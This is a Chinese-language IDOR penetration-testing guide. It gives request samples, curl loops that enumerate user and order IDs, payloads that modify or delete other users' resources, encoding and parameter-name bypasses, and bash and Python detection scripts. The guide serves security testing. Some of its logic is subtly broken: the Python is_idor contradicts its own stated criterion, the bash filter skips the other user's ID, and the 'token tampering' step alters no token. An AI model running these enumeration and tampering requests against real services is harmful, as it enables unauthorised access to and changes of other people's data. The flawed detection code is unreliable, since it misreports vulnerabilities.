# IDOR 越权测试

## 1. 概述

IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是指通过修改请求中的参数值来访问未经授权的他人资源。

**危险等级**: 高

## 2. 测试点识别

### 2.1 常见越权参数

| 参数名 | 示例 |
|--------|------|
| id | `?id=123` |
| userId | `?userId=456` |
| orderId | `?orderId=789` |
| documentId | `?documentId=100` |
| fileId | `?fileId=200` |

### 2.2 常见越权接口

| 接口类型 | 示例 |
|----------|------|
| 查看他人资料 | `GET /api/user/info?userId=X` |
| 查看他人订单 | `GET /api/order/list?userId=X` |
| 查看他人消息 | `GET /api/message/list?receiverId=X` |
| 修改他人资料 | `POST /api/user/update` |
| 删除他人资源 | `DELETE /api/resource?id=X` |

## 3. 测试方法

### 3.1 水平越权测试

```bash
# 1. 用户A正常登录
POST /api/login
{"username": "userA", "password": "xxx"}
# 返回: {"userId": "100", "name": "User A"}

# 2. 用户A访问自己的数据
GET /api/user/info?userId=100
Headers: {"Authorization": "Bearer token_A"}
# 响应: {"userId": 100, "name": "User A", ...}

# 3. 用户A尝试访问用户B的数据
GET /api/user/info?userId=101
Headers: {"Authorization": "Bearer token_A"}
# 返回用户B的数据 → 存在IDOR
# 返回无权限/自己的数据 → 安全
```

### 3.2 批量遍历测试

```bash
# 批量测试 userId
for i in {100..110}; do
    curl -s "http://api/user/info?userId=$i" \
        -H "Authorization: Bearer token_A"
done

# 批量测试 orderId
for i in {1..10}; do
    curl -s "http://api/order/detail?orderId=$i" \
        -H "Authorization: Bearer token_A"
done
```

### 3.3 POST 参数篡改

```bash
# 1. 正常修改自己的信息
POST /api/user/update
Headers: {"Authorization": "Bearer token_A"}
{"userId": 100, "name": "User A Modified"}

# 2. 修改他人的信息
POST /api/user/update
Headers: {"Authorization": "Bearer token_A"}
{"userId": 101, "name": "User B Modified"}
# 成功修改 → 存在IDOR
```

### 3.4 JWT/Token 篡改

```bash
# 1. 获取用户A的Token
POST /api/login
{"username": "userA", "password": "xxx"}
# 返回 Token A

# 2. 在 Token 中修改 userId 或直接修改请求参数
GET /api/user/info?userId=101
Headers: {"Authorization": "Bearer token_A"}
# 绕过验证访问用户B数据
```

## 4. 测试场景

### 4.1 资源查看

```bash
# 订单
GET /api/order/{orderId}

# 发票
GET /api/invoice/{invoiceId}

# 文件
GET /api/file/{fileId}

# 消息
GET /api/message/{messageId}
```

### 4.2 资源修改

```bash
# 修改订单
POST /api/order/{orderId}
{"status": "cancelled"}

# 修改收货地址
POST /api/address/{addressId}
{"address": "hacker_address"}

# 修改手机号
POST /api/user/phone
{"phone": "13900000000"}
```

### 4.3 资源删除

```bash
DELETE /api/order/{orderId}
DELETE /api/file/{fileId}
DELETE /api/user/{userId}
```

## 5. 防护绕过

### 5.1 参数变形

```bash
# 尝试不同的参数名
?userId=100
?user_id=100
?user-id=100
?uid=100
?id=100
```

### 5.2 编码绕过

```bash
# Base64 编码
?id=MTAw (Base64 of 100)

# 十六进制
?id=0x64

# 双重 URL 编码
?id=%31%30%30
```

### 5.3 类型转换

```bash
# 字符串转数字
?id[]=100
?id=100.0
?id="100"
```

## 6. 关联漏洞

| 后续漏洞 | 利用路径 |
|----------|----------|
| 敏感信息泄露 | 遍历获取大量用户数据 |
| 垂直越权 | 篡改 role 参数提升权限 |
| 金融欺诈 | 修改他人订单、支付信息 |

## 7. 测试检查清单

```
□ 识别所有带 ID 参数的接口
□ 测试水平越权（访问他人同级别资源）
□ 测试垂直越权（访问更高级别资源）
□ 批量遍历测试（for循环）
□ 测试 POST 参数篡改
□ 测试 Token 篡改
□ 测试防护绕过（参数变形、编码）
□ 评估数据泄露范围
□ 检查是否有频率限制
```

## 8. IDOR 自动化测试脚本

### 8.1 误报判断标准

**【核心】判断IDOR必须有明确的差异证明**

```
判断逻辑：
1. 用自己账号获取自己数据 → 记录响应结构
2. 用自己账号尝试获取他人数据 → 检查响应差异
3. 差异必须是"他人数据"而不是"自己的另一个数据"

【真实IDOR特征】
- 返回了userId=X的数据，但请求用的是userId=Y的token
- 水平越权：返回了同级用户的数据
- 垂直越权：低权限用户获取了高权限数据

【误报特征】
- 公开接口本来就返回这些数据
- 返回的是"空数据"或"无权访问"提示
- 只是ID格式不同，实际获取的还是自己的数据
```

### 8.2 curl + 对比验证流程

```bash
# 1. 获取用户A的正常数据（基准）
curl -s -H "Authorization: Bearer token_A" \
  "http://api/user/info?userId=100" > idor_baseline.json

# 2. 尝试用用户A的token访问用户B的数据
curl -s -H "Authorization: Bearer token_A" \
  "http://api/user/info?userId=101" > idor_test.json

# 3. 对比两次响应
diff idor_baseline.json idor_test.json

# 4. 判断标准
# - 如果两次响应完全相同 → 可能不是IDOR（或者两人数据相同）
# - 如果userId从100变成101且数据也变了 → 确认IDOR
# - 如果返回"无权访问"→ 安全
```

### 8.3 多参数遍历测试

```bash
#!/bin/bash
# IDOR多参数批量测试

TOKEN="user_token"
BASE_URL="http://api"

# 常见越权参数
PARAMS=("userId" "id" "orderId" "documentId" "fileId" "accountId")

for param in "${PARAMS[@]}"; do
    echo "Testing $param..."
    
    # 测试不同ID值
    for i in {100..105}; do
        RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" \
            "$BASE_URL/user/info?${param}=${i}")
        
        # 检查是否返回了数据（而非错误提示）
        if echo "$RESPONSE" | grep -q "userId"; then
            # 提取返回的userId
            RETURNED_ID=$(echo "$RESPONSE" | grep -o '"userId":[0-9]*' | head -1)
            echo "  ${param}=${i} → $RETURNED_ID"
            
            # 判断是否为IDOR（返回的userId与请求的不同）
            if [[ "$RETURNED_ID" != *"100"* ]] && [[ "$RETURNED_ID" != *"101"* ]]; then
                if [[ "$RETURNED_ID" == *"$i"* ]]; then
                    echo "  [潜在IDOR] 请求${param}=${i}，返回了对应数据"
                fi
            fi
        fi
    done
done
```

### 8.4 Python脚本（复杂场景）

```python
import requests
import json
import difflib

base_url = "http://api"
token = "user_token"

def get_baseline():
    """获取正常响应基准"""
    resp = requests.get(
        f"{base_url}/user/info",
        params={"userId": 100},
        headers={"Authorization": f"Bearer {token}"}
    )
    return resp.json()

def test_idor(param_name, param_value):
    """测试单个IDOR"""
    resp = requests.get(
        f"{base_url}/user/info",
        params={param_name: param_value},
        headers={"Authorization": f"Bearer {token}"}
    )
    return resp

def is_idor(baseline, response):
    """
    判断是否为真实IDOR
    
    【判断标准】
    1. 响应状态码必须是200
    2. 响应必须包含数据（不能是错误提示）
    3. 返回的数据必须与请求的ID对应
    4. 不能是"无权访问"或"用户不存在"
    """
    if response.status_code != 200:
        return False, "状态码不是200"
    
    try:
        data = response.json()
    except:
        return False, "响应不是JSON"
    
    # 检查是否返回了数据（而非错误）
    if not data or len(data) == 0:
        return False, "返回空数据"
    
    # 检查是否有错误提示
    error_keywords = ["无权限", "权限不足", "不存在", "error", "failed"]
    data_str = json.dumps(data).lower()
    for kw in error_keywords:
        if kw in data_str:
            return False, f"包含错误提示: {kw}"
    
    # 【核心判断】baseline和test返回的数据是否有实际差异
    baseline_str = json.dumps(baseline, sort_keys=True)
    test_str = json.dumps(data, sort_keys=True)
    
    if baseline_str == test_str:
        return False, "响应与基准完全相同"
    
    # 检查返回的ID是否与请求的ID匹配
    if "userId" in data and data["userId"] != param_value:
        return True, f"IDOR: 请求userId={param_value}, 返回userId={data['userId']}"
    
    return False, "数据有差异但可能是正常业务"

# 主测试流程
baseline = get_baseline()
print(f"基准数据: {json.dumps(baseline, indent=2)}")

# 测试不同ID
ids_to_test = [101, 102, 103, 104, 105]
for test_id in ids_to_test:
    response = test_idor("userId", test_id)
    is_vuln, reason = is_idor(baseline, response)
    
    if is_vuln:
        print(f"[VULN] IDOR - userId={test_id}: {reason}")
        print(f"  响应: {response.json()}")
    else:
        print(f"[SAFE] userId={test_id}: {reason}")
```
